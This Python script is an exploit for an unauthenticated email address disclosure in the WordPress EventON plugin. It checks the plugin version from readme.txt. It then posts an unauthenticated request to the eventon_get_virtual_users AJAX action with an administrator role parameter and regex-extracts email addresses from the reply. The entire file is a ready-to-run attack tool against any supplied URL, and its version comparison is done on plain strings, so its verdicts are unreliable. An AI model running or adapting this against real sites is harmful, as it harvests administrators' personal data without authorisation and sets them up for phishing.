import requests
import argparse
import re



#by Nxploit | Khaled_alenazi

def check_version(url, vulnerable_version):
    try:
        # Read the readme.txt file from the plugin directory
        response = requests.get(f"{url}/wp-content/plugins/eventon-lite/readme.txt")
        response.raise_for_status()

        # Search for the version in the readme file
        lines = response.text.splitlines()
        version = None
        for line in lines:
            if line.startswith("Stable tag:"):
                version = line.split(":")[1].strip()
                break

        if version is None:
            print("Version information not found in readme.txt")
            return

        print(f"Found version: {version}")

        # Check if the version is vulnerable
        if version <= vulnerable_version:
            print("The site is vulnerable.")
        else:
            print("The site is not vulnerable.")

    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def send_post_request(url):
    try:
        post_url = f"{url}/wp-admin/admin-ajax.php?action=eventon_get_virtual_users"
        response = requests.post(post_url, data={'_user_role': 'administrator'})
        response.raise_for_status()

        # Try to extract email or other indicators from the response
        response_text = response.text
        emails = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", response_text)
        if emails:
            print("Found the following email(s) in the response:")
            for email in emails:
                print(email)
        else:
            print("No emails found in the response. Response text:")
            print(response_text)

    except requests.RequestException as e:
        print(f"An error occurred during POST request: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="EventON (Free < 2.2.8, Premium < 4.5.5) - Unauthenticated Email Address Disclosure.")
    parser.add_argument('--url', '-u', type=str, required=True, help='The base URL of the WordPress site.')
    args = parser.parse_args()

    site_url = args.url
    vulnerable_version = "2.2.7"

    check_version(site_url, vulnerable_version)
    send_post_request(site_url)